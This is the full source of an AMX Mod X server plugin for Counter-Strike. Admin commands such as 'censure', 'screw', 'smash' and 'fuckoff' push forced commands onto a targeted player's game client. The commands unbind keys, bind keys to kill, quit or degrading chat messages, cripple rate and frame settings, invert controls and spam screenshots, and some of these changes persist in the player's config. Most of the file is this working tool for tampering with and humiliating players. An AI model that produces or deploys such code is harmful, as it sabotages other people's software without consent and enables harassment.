#include <amxmodx>
#include <amxmisc>
#include <engine>

#define VERSION "0.0.1d"

#define PREFIX "[AMX_FUCKOFF]"

new g_szFuckThinkerCN[]="fuck_thinker"

new g_iTarget
new g_szTargetName[32]

new bool:g_bSpanked[33]
new bool:g_bSpun[33]
new bool:g_bSmashed[33]
new bool:g_bFuckedOff[33]
new bool:g_bPimpSlapped[33]
new bool:g_bScrewed[33]
new bool:g_bCensured[33]

new g_iID

public plugin_init() {
	register_plugin("amx_fuckoff",VERSION,"Firippu")

	register_concmd("amx_spin","cmd_spin")
	register_concmd("amx_fuckoff","cmd_fuckoff")
	register_concmd("amx_spank","cmd_spank")
	register_concmd("amx_smash","cmd_smash")
	register_concmd("amx_screw","cmd_screw")
	register_concmd("amx_pimpslap","cmd_pimpslap")
	register_concmd("amx_censure","cmd_censure")

	new iEntity
	if((iEntity = create_entity("info_target"))) {
		entity_set_string(iEntity,EV_SZ_classname,g_szFuckThinkerCN)
		entity_set_float(iEntity,EV_FL_nextthink,get_gametime() + 10.0)
		register_think(g_szFuckThinkerCN,g_szFuckThinkerCN)
	}
}

public client_disconnect(id) {
	g_bSpanked[id]=false
	g_bSpun[id]=false
	g_bSmashed[id]=false
	g_bFuckedOff[id]=false
	g_bPimpSlapped[id]=false
	g_bScrewed[id]=false
	g_bCensured[id]=false
}

public fuck_thinker(iEntity) {
	for(g_iID=1; g_iID<=32; g_iID++) {
		if(g_bSpanked[g_iID]) {
			client_cmd(g_iID,"snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait;snapshot;wait")
		}

		if(g_bSpun[g_iID]) {
			if(is_user_alive(g_iID)) {
				client_cmd(g_iID,"+right")

				if(entity_get_int(g_iID,EV_INT_flags) & FL_ONGROUND) {
					static Float:Velocity[3]
					entity_get_vector(g_iID,EV_VEC_velocity,Velocity)

					Velocity[0] = random_float(200.0,500.0)
					Velocity[1] = random_float(200.0,500.0)
					Velocity[2] = random_float(200.0,500.0)

					entity_set_vector(g_iID,EV_VEC_velocity,Velocity)
				}

				entity_set_float(g_iID,EV_FL_friction,0.1)
				entity_set_float(g_iID,EV_FL_gravity,0.1)
			}
		}

		if(g_bSmashed[g_iID]) {
			client_cmd(g_iID,"timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait;timerefresh;wait")
		}

		if(g_bPimpSlapped[g_iID]) {
			client_cmd(g_iID,"+forward;wait;+right")
		}
	}

	entity_set_float(iEntity,EV_FL_nextthink,get_gametime() + 1.0)
}

public cmd_censure(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bCensured[g_iTarget]=!g_bCensured[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bCensured[g_iTarget]) {
		client_cmd(g_iTarget,"unbind w;wait;unbind a;unbind s;wait;unbind d;bind mouse1 ^"say Sunt un cacat de doi bani !!!^";wait;unbind mouse2;unbind mouse3;wait;bind space quit")
		client_cmd(g_iTarget,"unbind ctrl;wait;unbind 1;unbind 2;wait;unbind 3;unbind 4;wait;unbind 5;unbind 6;wait;unbind 7")
		client_cmd(g_iTarget,"unbind 8;wait;unbind 9;unbind 0;wait;unbind r;unbind e;wait;unbind g;unbind q;wait;unbind shift")
		client_cmd(g_iTarget,"unbind end;wait;bind escape ^"say I'm a helpless little shit^";unbind z;wait;unbind x;unbind c;wait;unbind uparrow;unbind downarrow;wait;unbind leftarrow")
		client_cmd(g_iTarget,"unbind rightarrow;wait;unbind mwheeldown;unbind mwheelup;wait;bind ` ^"say Sunt neajutorat^";bind ~ ^"say Sunt un neajutorat^"")
		client_cmd(g_iTarget,"rate 1;gl_flipmatrix 1;cl_cmdrate 10;cl_updaterate 10;fps_max 1;hideradar;con_color ^"1 1 1^"")
		client_cmd(g_iTarget,"quit")

		CmdLog(id,g_iTarget,"CENSURE")
		client_print(id,print_console,"%s Executed Censure %s",PREFIX,g_szTargetName)
	} else {
		client_cmd(g_iTarget,"bind b buy;wait;wait;bind m chooseteam;wait;wait;bind UPARROW +forward;wait;wait;bind w +forward;wait;wait;bind DOWNARROW +back;wait;wait;bind s +back")
		client_cmd(g_iTarget,"bind a +moveleft;wait;wait;bind d +moveright;wait;wait;bind SPACE +jump;wait;wait;bind MOUSE1 +attack;wait;wait;bind ENTER +attack;wait;wait;bind MOUSE2 +attack2")
		client_cmd(g_iTarget,"bind \ +attack2;wait;wait;bind r +reload;wait;wait;bind g drop;wait;wait;bind e +use;wait;wait;bind SHIFT +speed;wait;wait;bind n nightvision;wait;wait;bind f ^"impulse 100^"")
		client_cmd(g_iTarget,"bind t ^"impulse 201^";wait;wait;bind 1 slot1;wait;wait;bind 2 slot2;wait;wait;bind 3 slot3;wait;wait;bind 4 slot4;wait;wait;bind 5 slot5;wait;wait;bind 6 slot6;wait;wait;bind 7 slot7")
		client_cmd(g_iTarget,"bind 8 slot8;wait;wait;bind 9 slot9;wait;wait;bind 10 slot10;wait;wait;bind MWHEELDOWN invnext;wait;wait;bind MWHEELUP invprev;wait;wait;bind ] invnext;wait;wait;bind [ invprev")
		client_cmd(g_iTarget,"bind TAB +showscores;wait;wait;bind y messagemode;wait;wait;bind u messagemode2;wait;wait;bind F5 screenshot;showradar;rate 9999;cl_cmdrate 30;cl_updaterate 30")
		client_cmd(g_iTarget,"bind ctrl +duck;wait;wait;bind z radio1;wait;wait;bind x radio2;wait;wait;bind c radio3")
		client_cmd(g_iTarget,"con_color ^"255 180 30^";fps_max 100.0;gl_flipmatrix 0")
		client_cmd(g_iTarget,"exec userconfig.cfg")

		CmdLog(id,g_iTarget,"UNCENSURE")
		client_print(id,print_console,"%s Removed Censure on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public cmd_pimpslap(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bPimpSlapped[g_iTarget]=!g_bPimpSlapped[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bPimpSlapped[g_iTarget]) {
		client_cmd(g_iTarget,"bind ` ^"say Consola mea a luatro razna^";bind ~ ^"say My console seems to be broken^";bind escape ^"say My escape key seems to be broken^";+forward;wait;+right")

		CmdLog(id,g_iTarget,"PIMPSLAP")
		client_print(id,print_console,"%s Executed PimpSlap on %s",PREFIX,g_szTargetName)
	} else {
		client_cmd(g_iTarget,"bind ` toggleconsole;bind ~ toggleconsole;bind escape cancelselect;-forward;wait;-right")

		CmdLog(id,g_iTarget,"UNPIMPSLAP")
		client_print(id,print_console,"%s Removed PimpSlap on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public cmd_screw(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bScrewed[g_iTarget]=!g_bScrewed[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bScrewed[g_iTarget]) {
		client_cmd(g_iTarget,"bind w +back;wait;bind s +forward;bind a +right;wait;bind d +left;bind UPARROW +back;wait;bind DOWNARROW +forward;bind LEFTARROW +right;wait;bind RIGHTARROW +left")
		client_cmd(g_iTarget,"unbind `;wait;unbind ~;unbind escape")

		CmdLog(id,g_iTarget,"SCREW")
		client_print(id,print_console,"%s Executed Screw on %s",PREFIX,g_szTargetName)
	} else {
		client_cmd(g_iTarget,"exec config.cfg")
		client_cmd(g_iTarget,"exec userconfig.cfg")

		CmdLog(id,g_iTarget,"UNSCREW")
		client_print(id,print_console,"%s Removed Screw on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public cmd_smash(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bSmashed[g_iTarget]=!g_bSmashed[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bSmashed[g_iTarget]) {
		client_cmd(g_iTarget,"rate 1;cl_cmdrate 10; cl_updaterate 10;fps_max 1")

		CmdLog(id,g_iTarget,"SMASH")
		client_print(id,print_console,"%s Executed Smash on %s",PREFIX,g_szTargetName)
	} else {
		client_cmd(g_iTarget,"rate 9999;cl_cmdrate 30; cl_updaterate 30;fps_max 100.0;retry")

		CmdLog(id,g_iTarget,"UNSMASH")
		client_print(id,print_console,"%s Removed Smash on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public cmd_fuckoff(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bFuckedOff[g_iTarget]=!g_bFuckedOff[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bFuckedOff[g_iTarget]) {
		client_cmd(g_iTarget,"bind w kill;wait;bind a kill;bind s kill;wait;bind d kill;bind mouse1 kill;wait;bind mouse2 kill;bind mouse3 kill;wait;bind space kill")
		client_cmd(g_iTarget,"bind ctrl kill;wait;bind 1 kill;wait;bind 2 kill;wait;bind 3 kill;wait;bind 4 kill;wait;bind 5 kill;bind 6 kill;wait;bind 7 kill")
		client_cmd(g_iTarget,"bind 8 kill;wait;bind 9 kill;wait;bind 0 kill;wait;bind r kill;wait;bind e kill;wait;bind g kill;bind q kill;wait;bind shift kill")
		client_cmd(g_iTarget,"bind end kill;wait;bind escape kill;bind z kill;wait;bind x kill;wait;bind c kill;wait;bind uparrow kill;bind downarrow kill;wait;bind leftarrow kill")
		client_cmd(g_iTarget,"bind rightarrow kill;wait;bind mwheeldown kill;wait;bind mwheelup kill;wait;bind ` kill;bind ~ kill")

		CmdLog(id,g_iTarget,"FUCKOFF")
		client_print(id,print_console,"%s Executed FuckOff on %s",PREFIX,g_szTargetName)
	} else {
		client_cmd(g_iTarget,"exec config.cfg")
		client_cmd(g_iTarget,"exec userconfig.cfg")

		CmdLog(id,g_iTarget,"UNFUCKOFF")
		client_print(id,print_console,"%s Removed FuckOff on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public cmd_spin(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bSpun[g_iTarget]=!g_bSpun[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bSpun[g_iTarget]) {
		CmdLog(id,g_iTarget,"SPIN")
		client_print(id,print_console,"%s Executed Spin on %s",PREFIX,g_szTargetName)
	} else {
		client_cmd(g_iTarget,"-right")
		entity_set_float(g_iTarget,EV_FL_friction,1.0)
		entity_set_float(g_iTarget,EV_FL_gravity,1.0)

		CmdLog(id,g_iTarget,"UNSPIN")
		client_print(id,print_console,"%s Removed Spin on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public cmd_spank(id,level,cid) {
	if(!bHasPermission(id) || !bSetTarget(id)) return PLUGIN_HANDLED

	g_bSpanked[g_iTarget]=!g_bSpanked[g_iTarget]

	get_user_name(g_iTarget,g_szTargetName,31)

	if(g_bSpanked[g_iTarget]) {
		CmdLog(id,g_iTarget,"SPANK")
		client_print(id,print_console,"%s Executed Spank on %s",PREFIX,g_szTargetName)
	} else {
		CmdLog(id,g_iTarget,"UNSPANK")
		client_print(id,print_console,"%s Removed Spank on %s",PREFIX,g_szTargetName)
	}

	return PLUGIN_HANDLED
}

public bool:bHasPermission(iAdmin) {
	if(get_user_flags(iAdmin) & ADMIN_RCON) {
		return true
	}

	client_print(iAdmin,print_console,"%s No Access",PREFIX)
	return false
}

public bool:bSetTarget(iAdmin) {
	static szArgs[32]
	read_args(szArgs,charsmax(szArgs))

	//g_iTarget = find_player("bl",szArgs)
	g_iTarget = cmd_target(iAdmin,szArgs,1)
	switch(g_iTarget) {
		case 1..32: {
			if(is_user_admin(g_iTarget)) {
				client_print(iAdmin,print_console,"%s Cannot Target Another Admin",PREFIX)
				return false
			}

			//log_amx("%s DEBUG INDEX within: Name: %s, Index: %d",PREFIX,szArgs,g_iTarget)
			return true
		}
	}

	//log_amx("%s DEBUG INDEX outbounds: Name: %s, Index: %d",PREFIX,szArgs,g_iTarget)
	client_print(iAdmin,print_console,"%s Invalid Name",PREFIX)
	return false
}

public CmdLog(iAdmin,iVictim,szCommand[]) {
	static szAdminName[32]
	static szAdminSteamID[32]
	static szAdminIP[16]

	static szVictimName[32]
	static szVictimSteamID[32]
	static szVictimIP[16]

	get_user_name(iAdmin,szAdminName,31)
	get_user_authid(iAdmin,szAdminSteamID,31)
	get_user_ip(iAdmin,szAdminIP,15,1)

	get_user_name(iVictim,szVictimName,31)
	get_user_authid(iVictim,szVictimSteamID,31)
	get_user_ip(iVictim,szVictimIP,15,1)

	log_amx("%s CMD: <%s>, Admin: <%s> <%s> <%s>, Affected Player: <%s> <%s> <%s>",PREFIX,szCommand,szAdminName,szAdminSteamID,szAdminIP,szVictimName,szVictimSteamID,szVictimIP)
}
